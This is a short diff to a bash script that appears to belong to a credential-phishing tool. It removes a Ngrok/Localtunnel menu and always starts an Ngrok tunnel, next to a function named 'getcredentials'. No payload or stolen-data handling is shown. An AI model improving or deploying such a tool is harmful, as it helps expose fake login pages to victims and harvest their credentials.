@@ -338,19 +338,9 @@ getcredentials
 }
 start() {
 printf "\n"
-printf "1.Ngrok\n"
-printf "2.Localtunnel\n"
-echo ""
-read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose the tunneling method:]─[~]
- └──╼ ~ ' host
- 
-if [[ $host == 1 ]]; then
+printf "\e[1;92m[\e[0m*\e[1;92m] Using Ngrok tunnel (no password required)...\e[0m\n"
 sleep 1
 start_ngrok
-elif [[ $host == 2 ]]; then
-sleep 1
-start_localtunnel
-fi
 }
 
 start_ngrok() {
